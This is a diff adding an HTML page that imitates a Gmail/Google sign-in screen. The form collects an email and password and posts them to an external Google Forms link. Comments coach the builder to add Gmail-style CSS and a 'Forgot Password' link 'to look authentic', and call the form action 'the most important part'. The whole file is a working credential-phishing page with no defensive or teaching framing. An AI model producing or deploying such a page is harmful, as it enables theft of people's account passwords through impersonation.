@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gmail Secure Login - Verify Account</title>
+    <!-- You would add CSS here to make it look like Gmail -->
+</head>
+<body>
+
+    <h1>Sign in to your Google Account</h1>
+
+    <!-- THIS IS THE MOST IMPORTANT PART: Action points to your Google Form link -->
+    <form action="[https://docs.google.com/forms/d/e/1FAIpQLSdZPZ48JVOLkCYhdhd_PNTGyI78m-11nQU1U7Qfvn8JppL7Iw/viewform?usp=publish-editor]" method="POST">
+
+        <!-- Username Field -->
+        <label for="email">Email or phone:</label>
+        <input type="email" id="email" name="entry.123456789" required> 
+        <!-- NOTE: 'entry.123456789' is the unique ID from Google Forms, NOT the actual email -->
+
+        <!-- Password Field -->
+        <label for="pass">Password:</label>
+        <input type="password" id="pass" name="entry.987654321" required>
+
+        <button type="submit">Next</button>
+    </form>
+
+    <!-- Add extra elements like "Forgot Password" links to look authentic -->
+
+</body>
+</html>
